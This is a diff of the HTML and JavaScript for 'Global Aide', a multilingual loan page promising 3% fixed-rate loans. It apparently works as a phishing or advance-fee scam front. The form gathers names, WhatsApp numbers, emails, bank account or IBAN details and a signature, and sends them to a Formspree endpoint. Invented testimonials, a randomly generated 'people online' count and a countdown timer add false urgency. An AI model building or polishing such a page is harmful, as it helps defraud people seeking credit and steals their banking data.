@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Aide | Finance Innovative 2026</title>
+    <title>Global Aide | Finance 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -13,7 +13,6 @@
         .lang-btn.selected { border: 3px solid #fbbf24 !important; background-color: rgba(255,255,255,0.2) !important; transform: scale(1.05); }
         .slider { -webkit-appearance: none; width: 100%; height: 8px; border-radius: 5px; background: #cbd5e1; outline: none; }
         .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
         #signature-pad { border: 2px dashed #cbd5e1; background: #f8fafc; cursor: crosshair; touch-action: none; }
     </style>
 </head>
@@ -25,17 +24,17 @@
 
     <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center bg-gradient-to-br from-blue-900 to-blue-800 text-white p-6">
         <div class="text-center mb-10">
-            <div class="w-20 h-20 bg-white/10 rounded-3xl flex items-center justify-center mx-auto mb-6 border border-white/20 shadow-lg">
+            <div class="w-20 h-20 bg-white/10 rounded-3xl flex items-center justify-center mx-auto mb-6 border border-white/20">
                 <i class="fas fa-globe-americas text-4xl text-yellow-400"></i>
             </div>
-            <h1 class="text-4xl font-black uppercase mb-2 tracking-tighter">Global Aide</h1>
-            <p class="opacity-70 text-sm font-medium uppercase tracking-widest">Financial Inclusion 2026</p>
+            <h1 class="text-4xl font-black uppercase mb-2">Global Aide</h1>
+            <p class="opacity-70 text-sm font-medium uppercase tracking-widest">Global Finance Solution</p>
         </div>
         <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-12">
-            <button onclick="selectLang('fr', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-fr"><span class="text-2xl">🇫🇷</span> <span>Français</span></button>
-            <button onclick="selectLang('en', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-en"><span class="text-2xl">🇺🇸</span> <span>English</span></button>
-            <button onclick="selectLang('es', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-es"><span class="text-2xl">🇪🇸</span> <span>Español</span></button>
-            <button onclick="selectLang('de', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-de"><span class="text-2xl">🇩🇪</span> <span>Deutsch</span></button>
+            <button onclick="selectLang('fr', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-fr"><span>🇫🇷</span> <span>Français</span></button>
+            <button onclick="selectLang('en', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-en"><span>🇺🇸</span> <span>English</span></button>
+            <button onclick="selectLang('es', '$')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-es"><span>🇪🇸</span> <span>Español</span></button>
+            <button onclick="selectLang('de', '€')" class="lang-btn p-5 rounded-2xl border-2 border-white/10 bg-white/5 font-bold flex flex-col items-center gap-2" id="btn-de"><span>🇩🇪</span> <span>Deutsch</span></button>
         </div>
         <button id="lang-continue" onclick="goToStep(2)" style="display: none;" class="w-full max-w-sm bg-yellow-400 text-blue-900 py-5 rounded-2xl font-black text-xl shadow-2xl flex items-center justify-center gap-3">
             <span id="btn-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
@@ -45,8 +44,8 @@
     <section id="step-sim" class="step min-h-screen flex-col p-4">
         <div class="max-w-xl mx-auto w-full pt-4">
             <div class="flex justify-between items-center mb-6">
-                <div class="font-black text-xl text-blue-700 tracking-tighter italic">GLOBAL AIDE</div>
-                <div class="text-[10px] bg-green-100 text-green-700 px-3 py-1 rounded-full font-bold animate-pulse">
+                <div class="font-black text-xl text-blue-700 tracking-tighter italic uppercase">Global Aide</div>
+                <div class="text-[10px] bg-green-100 text-green-700 px-3 py-1 rounded-full font-bold">
                     <i class="fas fa-circle text-[6px] mr-1"></i> <span id="live-count">14 personnes en ligne</span>
                 </div>
             </div>
@@ -59,7 +58,7 @@
                     <div class="flex justify-between items-end mb-4 font-black text-slate-700">
                         <span id="lbl-amt" class="text-sm uppercase opacity-50">Montant</span>
                         <div class="flex items-center border-b-2 border-blue-600">
-                            <input type="number" id="amountInput" value="5000" min="1000" onchange="validateMin()" oninput="sync('amt')" class="text-3xl font-black text-blue-700 w-32 text-right bg-transparent outline-none">
+                            <input type="number" id="amountInput" value="5000" oninput="sync('amt')" class="text-3xl font-black text-blue-700 w-32 text-right bg-transparent outline-none">
                             <span class="curr text-3xl font-black text-blue-700 ml-1">€</span>
                         </div>
                     </div>
@@ -69,28 +68,22 @@
                     <div class="flex justify-between items-end mb-4 font-black text-slate-700">
                         <span id="lbl-dur" class="text-sm uppercase opacity-50">Durée</span>
                         <div class="flex items-center border-b-2 border-blue-600">
-                            <input type="number" id="yearInput" value="3" min="2" max="30" oninput="syncYear('num')" class="text-3xl font-black text-blue-700 w-16 text-right bg-transparent outline-none">
+                            <input type="number" id="yearInput" value="3" oninput="syncYear('num')" class="text-3xl font-black text-blue-700 w-16 text-right bg-transparent outline-none">
                             <span id="lbl-years" class="text-xl font-black text-blue-700 ml-2">Ans</span>
                         </div>
                     </div>
                     <input type="range" id="yearRange" min="2" max="30" step="1" value="3" oninput="syncYear('range')" class="slider">
                 </div>
-                <div class="bg-gradient-to-r from-blue-900 to-blue-800 text-white p-6 rounded-3xl shadow-2xl relative overflow-hidden">
-                    <div class="flex justify-between opacity-80 mb-2 text-sm">
-                        <span id="res-lbl-men">Mensualité :</span> 
-                        <span id="res-monthly" class="text-2xl font-black text-yellow-400">144 €</span>
-                    </div>
-                    <div class="flex justify-between border-t border-white/10 pt-2 mb-4 text-xs">
-                        <span id="res-lbl-tot">Total à rembourser :</span> 
-                        <span id="res-total" class="font-bold">5150 €</span>
-                    </div>
-                    <button onclick="goToStep(3)" class="w-full bg-yellow-400 text-blue-900 py-4 rounded-xl font-black uppercase shadow-lg hover:scale-105 transition-transform" id="btn-next">Suivant</button>
+                <div class="bg-gradient-to-r from-blue-900 to-blue-800 text-white p-6 rounded-3xl shadow-2xl">
+                    <div class="flex justify-between opacity-80 mb-2 text-sm"><span id="res-lbl-men">Mensualité :</span><span id="res-monthly" class="text-2xl font-black text-yellow-400">144 €</span></div>
+                    <div class="flex justify-between border-t border-white/10 pt-2 mb-4 text-xs"><span id="res-lbl-tot">Total :</span><span id="res-total" class="font-bold">5150 €</span></div>
+                    <button onclick="goToStep(3)" class="w-full bg-yellow-400 text-blue-900 py-4 rounded-xl font-black uppercase" id="btn-next">Suivant</button>
                 </div>
             </div>
-            <div id="testi-container" class="space-y-3"></div>
+            <div id="testi-container" class="grid grid-cols-1 gap-3 pb-10"></div>
         </div>
-                                </section>
-                                <section id="step-form" class="step min-h-screen flex-col p-4 bg-slate-100">
+                </section>
+          <section id="step-form" class="step min-h-screen flex-col p-4 bg-slate-100">
         <div class="max-w-xl mx-auto w-full pt-4 pb-10">
             <div class="flex justify-between items-center mb-4">
                 <button onclick="goToStep(2)" class="text-blue-700 font-bold flex items-center gap-2"><i class="fas fa-arrow-left"></i> <span id="btn-back">Retour</span></button>
@@ -102,38 +95,33 @@
                 <h2 class="text-2xl font-black text-blue-900 mb-2" id="form-title">Dernière étape</h2>
                 <p id="bank-instruction" class="text-[11px] text-slate-500 mb-6 leading-relaxed bg-blue-50 p-3 rounded-xl border-l-4 border-blue-500"></p>
                 <form action="https://formspree.io/f/xnjqwngo" method="POST" class="space-y-4" id="loanForm" onsubmit="return validateForm()">
-                    <input type="hidden" name="Montant_Calcule" id="h-m">
-                    <input type="hidden" name="Duree_Annees" id="h-d">
-                    <input type="hidden" name="Signature_Data" id="h-sign">
+                    <input type="hidden" name="Montant_Simulation" id="h-m">
+                    <input type="hidden" name="Duree_Simulation" id="h-d">
+                    <input type="hidden" name="Signature_Base64" id="h-sign">
                     <select id="country-select" name="Pays" onchange="updateCountryData()" class="w-full p-4 bg-slate-50 rounded-xl font-bold border border-slate-200">
                         <option value="France" data-code="+33" data-curr="€">🇫🇷 France</option>
                         <option value="Porto Rico" data-code="+1-787" data-curr="$">🇵🇷 Porto Rico</option>
                         <option value="Panama" data-code="+507" data-curr="$">🇵🇦 Panama</option>
-                        <option value="Ecuador" data-code="+593" data-curr="$">🇪🇨 Ecuador</option>
-                        <option value="Salvador" data-code="+503" data-curr="$">🇸🇻 Salvador</option>
                         <option value="USA" data-code="+1" data-curr="$">🇺🇸 USA</option>
                     </select>
-                    <input type="text" id="i-nom" name="Nom" placeholder="Nom Complet" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
-                    <div class="flex gap-2">
-                        <span id="phone-prefix" class="p-4 bg-slate-200 rounded-xl font-bold text-slate-600 flex items-center text-sm">+33</span>
-                        <input type="tel" id="i-wa" name="WhatsApp" placeholder="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 flex-grow outline-none">
-                    </div>
-                    <input type="email" id="i-email" name="Email" placeholder="Email" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
+                    <input type="text" id="i-nom" name="Nom" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
+                    <div class="flex gap-2"><span id="phone-prefix" class="p-4 bg-slate-200 rounded-xl font-bold text-slate-600 flex items-center text-sm">+33</span>
+                    <input type="tel" id="i-wa" name="WhatsApp" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 flex-grow outline-none"></div>
+                    <input type="email" id="i-email" name="Email" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
                     <div class="space-y-3 pt-4 border-t border-slate-100">
-                        <p class="text-[10px] font-black uppercase text-slate-400 ml-1">Infos de virement</p>
-                        <input type="text" id="i-bank-name" name="Nom_Banque" placeholder="Nom de votre banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
-                        <input type="text" id="i-bank-acc" name="Numero_Compte" placeholder="Numéro de compte / IBAN" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
-                        <input type="text" id="i-bank-addr" name="Adresse_Banque" placeholder="Adresse de la banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
+                        <input type="text" id="i-bank-name" name="Banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
+                        <input type="text" id="i-bank-acc" name="Compte" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
+                        <input type="text" id="i-bank-addr" name="Adresse_Banque" required class="w-full p-4 bg-slate-50 rounded-xl border border-slate-200 outline-none">
                     </div>
                     <div class="pt-4">
-                        <p class="text-[10px] font-black uppercase text-slate-400 ml-1 mb-2" id="lbl-sign">Signature numérique obligatoire</p>
+                        <p class="text-[10px] font-black uppercase text-slate-400 mb-2" id="lbl-sign">Signature obligatoire</p>
                         <canvas id="signature-pad" width="300" height="150" class="w-full rounded-xl"></canvas>
-                        <button type="button" onclick="clearSignature()" class="text-[10px] text-blue-600 font-bold mt-1 uppercase underline">Effacer</button>
+                        <button type="button" onclick="clearSignature()" class="text-[10px] text-blue-600 font-bold mt-1 uppercase underline" id="btn-clear">Effacer</button>
                     </div>
                     <button type="submit" class="w-full bg-blue-700 text-white p-5 rounded-xl font-black text-xl shadow-lg mt-4 flex justify-center items-center gap-2">
                         <i class="fas fa-paper-plane"></i> <span id="btn-submit">ENVOYER</span>
                     </button>
-                    <div class="flex justify-center items-center gap-4 opacity-30 mt-6 filter grayscale">
+                    <div class="flex justify-center items-center gap-4 opacity-30 mt-6 grayscale">
                         <i class="fab fa-cc-visa text-2xl"></i><i class="fab fa-cc-mastercard text-2xl"></i><i class="fas fa-shield-alt text-2xl"></i>
                     </div>
                 </form>
@@ -142,34 +130,56 @@
     </section>
 
     <script>
-        let currentLang = 'fr'; let currentCurrency = '€';
-        const canvas = document.getElementById('signature-pad'); const ctx = canvas.getContext('2d'); let writing = false;
-        function startDrawing(e) { writing = true; draw(e); }
-        function stopDrawing() { writing = false; ctx.beginPath(); }
-        function draw(e) { if (!writing) return; ctx.lineWidth = 2; ctx.lineCap = "round"; ctx.strokeStyle = "#1e3a8a"; const rect = canvas.getBoundingClientRect(); const x = (e.clientX || (e.touches ? e.touches[0].clientX : 0)) - rect.left; const y = (e.clientY || (e.touches ? e.touches[0].clientY : 0)) - rect.top; ctx.lineTo(x, y); ctx.stroke(); ctx.beginPath(); ctx.moveTo(x, y); }
-        canvas.addEventListener('mousedown', startDrawing); canvas.addEventListener('mousemove', draw); window.addEventListener('mouseup', stopDrawing); canvas.addEventListener('touchstart', startDrawing); canvas.addEventListener('touchmove', draw); canvas.addEventListener('touchend', stopDrawing);
-        function clearSignature() { ctx.clearRect(0, 0, canvas.width, canvas.height); }
-        function validateForm() { document.getElementById('h-sign').value = canvas.toDataURL(); alert(translations[currentLang].thanks); return true; }
+        let cL = 'fr', cC = '€';
+        const cv = document.getElementById('signature-pad'), cx = cv.getContext('2d');
+        let w = false;
+        function sD(e) { w = true; d(e); }
+        function stD() { w = false; cx.beginPath(); }
+        function d(e) { if (!w) return; cx.lineWidth = 2; cx.lineCap = "round"; cx.strokeStyle = "#1e3a8a"; const r = cv.getBoundingClientRect(); const x = (e.clientX || (e.touches ? e.touches[0].clientX : 0)) - r.left, y = (e.clientY || (e.touches ? e.touches[0].clientY : 0)) - r.top; cx.lineTo(x, y); cx.stroke(); cx.beginPath(); cx.moveTo(x, y); }
+        cv.addEventListener('mousedown', sD); cv.addEventListener('mousemove', d); window.addEventListener('mouseup', stD); cv.addEventListener('touchstart', sD); cv.addEventListener('touchmove', d); cv.addEventListener('touchend', stD);
+        function clearSignature() { cx.clearRect(0, 0, cv.width, cv.height); }
+        function validateForm() { document.getElementById('h-sign').value = cv.toDataURL(); alert(tr[cL].thanks); return true; }
 
-        const translations = {
-            fr: { cont: "CONTINUER", sim: "Simulation", sub: "Taux fixe 3%", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité:", tot: "Total:", next: "Suivant", fTitle: "Finalisation", back: "Retour", submit: "ENVOYER", bankNote: "Vos coordonnées sont nécessaires pour le prêt de", pl_nom: "Nom Complet", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Banque", pl_bankAcc: "N° Compte", pl_bankAddr: "Adresse", thanks: "Reçu !", tests: [{n:"Marc L.", l:"🇫🇷", t:"Rapide."}, {n:"Julie D.", l:"🇫🇷", t:"Parfait."}] },
-            en: { cont: "CONTINUE", sim: "Simulation", sub: "3% Rate", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly:", tot: "Total:", next: "Next", fTitle: "Final Step", back: "Back", submit: "SEND", bankNote: "Bank details needed for", pl_nom: "Full Name", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank Name", pl_bankAcc: "Account No", pl_bankAddr: "Address", thanks: "Received!", tests: [{n:"John D.", l:"🇺🇸", t:"Fast."}, {n:"Sarah K.", l:"🇺🇸", t:"Great."}] },
-            es: { cont: "CONTINUAR", sim: "Simulación", sub: "Tasa 3%", amt: "Monto", dur: "Plazo", yr: "Años", men: "Mensualidad:", tot: "Total:", next: "Siguiente", fTitle: "Paso Final", back: "Atrás", submit: "ENVIAR", bankNote: "Datos necesarios para", pl_nom: "Nombre", pl_wa: "WhatsApp", pl_email: "Correo", pl_bankName: "Banco", pl_bankAcc: "N° Cuenta", pl_bankAddr: "Dirección", thanks: "Recibido!", tests: [{n:"Carlos R.", l:"🇵🇷", t:"Rápido."}, {n:"Elena P.", l:"🇵🇦", t:"Excelente."}] },
-            de: { cont: "WEITER", sim: "Simulation", sub: "3% Zins", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich:", tot: "Gesamt:", next: "Weiter", fTitle: "Abschluss", back: "Zurück", submit: "SENDEN", bankNote: "Bankdaten benötigt für", pl_nom: "Name", pl_wa: "WhatsApp", pl_email: "Email", pl_bankName: "Bank", pl_bankAcc: "Konto", pl_bankAddr: "Adresse", thanks: "Empfangen!", tests: [{n:"Hans M.", l:"🇩🇪", t:"Schnell."}, {n:"Ingrid S.", l:"🇩🇪", t:"Sehr gut."}] }
+        const tr = {
+            fr: { 
+                cont: "CONTINUER", sim: "Simulation", sub: "Taux fixe 3%", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité:", tot: "Total:", next: "Suivant", fTitle: "Dernière étape", back: "Retour", submit: "ENVOYER LE DOSSIER", live: "personnes en ligne", clear: "Effacer la signature", sign: "Signature numérique obligatoire", bankNote: "Vos coordonnées bancaires sont nécessaires pour le virement de votre prêt de", thanks: "Dossier reçu ! Un agent vous contactera.",
+                pl_nom: "Nom Complet", pl_wa: "Numéro WhatsApp", pl_email: "Votre adresse Email", pl_bankName: "Nom de votre banque", pl_bankAcc: "Numéro de compte / IBAN", pl_bankAddr: "Adresse de la banque",
+                tests: [{n:"Marc L.", t:"Virement reçu en 48h. Service exceptionnel."}, {n:"Julie D.", t:"Taux de 3% réel. Merci Global Aide."}, {n:"Thomas B.", t:"Très simple d'utilisation, je recommande."}, {n:"Sophie G.", t:"Enfin un service sérieux et rapide."}, {n:"Lucas M.", t:"Le simulateur est très précis."}, {n:"Emma R.", t:"Accompagnement au top !"}]
+            },
+            en: { 
+                cont: "CONTINUE", sim: "Simulation", sub: "3% Fixed Rate", amt: "Loan Amount", dur: "Duration", yr: "Years", men: "Monthly:", tot: "Total:", next: "Next", fTitle: "Last Step", back: "Back", submit: "SEND APPLICATION", live: "people online", clear: "Clear signature", sign: "Digital signature required", bankNote: "Your bank details are required for the transfer of your loan of", thanks: "Application received! An agent will contact you.",
+                pl_nom: "Full Name", pl_wa: "WhatsApp Number", pl_email: "Email Address", pl_bankName: "Bank Name", pl_bankAcc: "Account Number / IBAN", pl_bankAddr: "Bank Address",
+                tests: [{n:"John D.", t:"Fast and professional. 3% is amazing."}, {n:"Sarah K.", t:"Funds received quickly. Highly recommended."}, {n:"Michael S.", t:"Best financial support I've used."}, {n:"Emily W.", t:"Easy application process."}, {n:"Robert J.", t:"Trustworthy and transparent."}, {n:"Jessica L.", t:"Great experience overall."}]
+            },
+            es: { 
+                cont: "CONTINUAR", sim: "Simulación", sub: "Tasa fija 3%", amt: "Monto", dur: "Plazo", yr: "Años", men: "Mensualidad:", tot: "Total:", next: "Siguiente", fTitle: "Paso Final", back: "Atrás", submit: "ENVIAR SOLICITUD", live: "personas en línea", clear: "Borrar firma", sign: "Firma digital obligatoria", bankNote: "Sus datos bancarios son necesarios para la transferencia de su préstamo de", thanks: "¡Solicitud recibida! Un agente le contactará.",
+                pl_nom: "Nombre Completo", pl_wa: "Número WhatsApp", pl_email: "Correo Electrónico", pl_bankName: "Nombre del Banco", pl_bankAcc: "Número de cuenta / IBAN", pl_bankAddr: "Dirección del Banco",
+                tests: [{n:"Carlos R.", t:"Excelente apoyo. Muy rápido."}, {n:"Elena P.", t:"Muy confiable. Gracias."}, {n:"Luis M.", t:"El mejor interés del mercado."}, {n:"Maria G.", t:"Soporte increíble en WhatsApp."}, {n:"Jorge V.", t:"Proceso transparente y honesto."}, {n:"Ana S.", t:"Recibí mi préstamo sin problemas."}]
+            },
+            de: { 
+                cont: "WEITER", sim: "Simulation", sub: "3% Fester Zins", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich:", tot: "Gesamt:", next: "Weiter", fTitle: "Letzter Schritt", back: "Zurück", submit: "ANTRAG SENDEN", live: "Personen online", clear: "Unterschrift löschen", sign: "Digitale Unterschrift erforderlich", bankNote: "Ihre Bankverbindung ist für die Überweisung Ihres Kredits erforderlich von", thanks: "Antrag eingegangen! Ein Mitarbeiter wird Sie kontaktieren.",
+                pl_nom: "Vollständiger Name", pl_wa: "WhatsApp Nummer", pl_email: "E-Mail-Adresse", pl_bankName: "Name der Bank", pl_bankAcc: "Kontonummer / IBAN", pl_bankAddr: "Adresse der Bank",
+                tests: [{n:"Hans M.", t:"Schnelle Auszahlung, top!"}, {n:"Ingrid S.", t:"Beste Konditionen mit 3%."}, {n:"Klaus B.", t:"Sehr seriös und freundlich."}, {n:"Petra W.", t:"Einfach und unkompliziert."}, {n:"Uwe R.", t:"Alles wie versprochen."}, {n:"Sabine L.", t:"Sehr zufrieden mit dem Service."}]
+            }
         };
 
-        function selectLang(lang, currency) { currentLang = lang; currentCurrency = currency; document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('selected')); document.getElementById('btn-' + lang).classList.add('selected'); document.getElementById('btn-text').innerText = translations[lang].cont; document.getElementById('lang-continue').style.display = 'flex'; updateUI(lang); }
-        function goToStep(s) { document.querySelectorAll('.step').forEach(el => el.classList.remove('active')); const ids = [null, 'step-lang', 'step-sim', 'step-form']; document.getElementById(ids[s]).classList.add('active'); document.getElementById('nav-progress').classList.remove('hidden'); document.getElementById('progress-bar').style.width = (s * 33) + "%"; window.scrollTo(0,0); if(s === 3) { updateBankInstruction(); startTimer(); } }
-        function sync(src) { const r = document.getElementById('amountRange'), n = document.getElementById('amountInput'); if(src === 'range') n.value = r.value; else r.value = n.value; calculate(); }
-        function syncYear(src) { const r = document.getElementById('yearRange'), n = document.getElementById('yearInput'); if(src === 'range') n.value = r.value; else r.value = n.value; calculate(); }
-        function validateMin() { const n = document.getElementById('amountInput'); if(parseInt(n.value) < 1000) { n.value = 1000; sync('num'); alert("Min 1000"); } }
-        function calculate() { const a = parseInt(document.getElementById('amountInput').value) || 1000; const y = parseInt(document.getElementById('yearInput').value) || 2; const tot = Math.round(a * 1.03); const mon = Math.round(tot / (y * 12)); document.getElementById('res-total').innerText = tot + " " + currentCurrency; document.getElementById('res-monthly').innerText = mon + " " + currentCurrency; document.getElementById('h-m').value = a + " " + currentCurrency; document.getElementById('h-d').value = y + " ans"; document.querySelectorAll('.curr').forEach(el => el.innerText = currentCurrency); }
-        function updateBankInstruction() { const t = translations[currentLang]; const amt = document.getElementById('amountInput').value; document.getElementById('bank-instruction').innerText = `${t.bankNote} ${amt} ${currentCurrency}.`; }
-        function updateUI(lang) { const t = translations[lang]; const set = (id, txt) => { if(document.getElementById(id)) document.getElementById(id).innerText = txt; }; set('sim-title', t.sim); set('hero-sub', t.sub); set('lbl-amt', t.amt); set('lbl-dur', t.dur); set('lbl-years', t.yr); set('res-lbl-men', t.men); set('res-lbl-tot', t.tot); set('btn-next', t.next); set('form-title', t.fTitle); set('btn-back', t.back); set('btn-submit', t.submit); document.getElementById('i-nom').placeholder = t.pl_nom; document.getElementById('i-wa').placeholder = t.pl_wa; document.getElementById('i-email').placeholder = t.pl_email; document.getElementById('i-bank-name').placeholder = t.pl_bankName; document.getElementById('i-bank-acc').placeholder = t.pl_bankAcc; document.getElementById('i-bank-addr').placeholder = t.pl_bankAddr; document.getElementById('testi-container').innerHTML = t.tests.map(test => `<div class="bg-white p-3 rounded-xl shadow-sm text-[10px] italic border">"${test.t}" - ${test.n}</div>`).join(''); const sel = document.getElementById('country-select'); if(lang === 'es') sel.value = "Porto Rico"; else if(lang === 'en') sel.value = "USA"; else sel.value = "France"; updateCountryData(); }
-        function updateCountryData() { const o = document.getElementById('country-select').options[document.getElementById('country-select').selectedIndex]; document.getElementById('phone-prefix').innerText = o.getAttribute('data-code'); currentCurrency = o.getAttribute('data-curr'); calculate(); }
-        function startTimer() { let d = 900; setInterval(() => { let m = Math.floor(d/60), s = d%60; document.getElementById('time-val').innerText = `${m}:${s<10?'0':''}${s}`; if(--d<0)d=0; }, 1000); }
-        setInterval(() => { document.getElementById('live-count').innerText = `${Math.floor(Math.random()*15+10)} personnes en ligne`; }, 5000);
-        window.onload = () => calculate();
+        function selectLang(l, c) { cL = l; cC = c; document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected')); document.getElementById('btn-' + l).classList.add('selected'); document.getElementById('btn-text').innerText = tr[l].cont; document.getElementById('lang-continue').style.display = 'flex'; upUI(l); }
+        function goToStep(s) { document.querySelectorAll('.step').forEach(e => e.classList.remove('active')); const i = [null, 'step-lang', 'step-sim', 'step-form']; document.getElementById(i[s]).classList.add('active'); document.getElementById('nav-progress').classList.remove('hidden'); document.getElementById('progress-bar').style.width = (s * 33) + "%"; if (s === 3) { upBI(); sT(); } }
+        function sync(s) { const r = document.getElementById('amountRange'), n = document.getElementById('amountInput'); if (s === 'range') n.value = r.value; else r.value = n.value; calc(); }
+        function syncYear(s) { const r = document.getElementById('yearRange'), n = document.getElementById('yearInput'); if (s === 'range') n.value = r.value; else r.value = n.value; calc(); }
+        function calc() { const a = parseInt(document.getElementById('amountInput').value) || 1000, y = parseInt(document.getElementById('yearInput').value) || 2; const t = Math.round(a * 1.03), m = Math.round(t / (y * 12)); document.getElementById('res-total').innerText = t + " " + cC; document.getElementById('res-monthly').innerText = m + " " + cC; document.getElementById('h-m').value = a + " " + cC; document.getElementById('h-d').value = y + " ans"; document.querySelectorAll('.curr').forEach(e => e.innerText = cC); }
+        function upBI() { const t = tr[cL], a = document.getElementById('amountInput').value; document.getElementById('bank-instruction').innerText = `${t.bankNote} ${a} ${cC} sur votre compte.`; }
+        function upUI(l) { 
+            const t = tr[l]; 
+            document.getElementById('sim-title').innerText = t.sim; document.getElementById('hero-sub').innerText = t.sub; document.getElementById('lbl-amt').innerText = t.amt; document.getElementById('lbl-dur').innerText = t.dur; document.getElementById('lbl-years').innerText = t.yr; document.getElementById('res-lbl-men').innerText = t.men; document.getElementById('res-lbl-tot').innerText = t.tot; document.getElementById('btn-next').innerText = t.next; document.getElementById('form-title').innerText = t.fTitle; document.getElementById('btn-back').innerText = t.back; document.getElementById('btn-submit').innerText = t.submit; document.getElementById('btn-clear').innerText = t.clear; document.getElementById('lbl-sign').innerText = t.sign;
+            document.getElementById('i-nom').placeholder = t.pl_nom; document.getElementById('i-wa').placeholder = t.pl_wa; document.getElementById('i-email').placeholder = t.pl_email; document.getElementById('i-bank-name').placeholder = t.pl_bankName; document.getElementById('i-bank-acc').placeholder = t.pl_bankAcc; document.getElementById('i-bank-addr').placeholder = t.pl_bankAddr;
+            document.getElementById('testi-container').innerHTML = t.tests.map(test => `<div class="bg-white p-4 rounded-2xl shadow-sm border border-slate-100"><p class="italic text-slate-600 text-[10px] mb-1">"${test.t}"</p><span class="font-bold text-[10px] text-blue-800">${test.n}</span></div>`).join('');
+            const sel = document.getElementById('country-select'); if (l === 'es') sel.value = "Porto Rico"; else if (l === 'en') sel.value = "USA"; else sel.value = "France"; upCD(); upLiveCount();
+        }
+        function upCD() { const o = document.getElementById('country-select').options[document.getElementById('country-select').selectedIndex]; document.getElementById('phone-prefix').innerText = o.getAttribute('data-code'); cC = o.getAttribute('data-curr'); calc(); }
+        function sT() { let d = 900; setInterval(() => { let m = Math.floor(d / 60), s = d % 60; document.getElementById('time-val').innerText = `${m}:${s < 10 ? '0' : ''}${s}`; if (--d < 0) d = 0; }, 1000); }
+        function upLiveCount() { const n = Math.floor(Math.random() * 15 + 15); document.getElementById('live-count').innerText = `${n} ${tr[cL].live}`; }
+        setInterval(upLiveCount, 5000); window.onload = calc;
     </script>
 </body>
 </html>
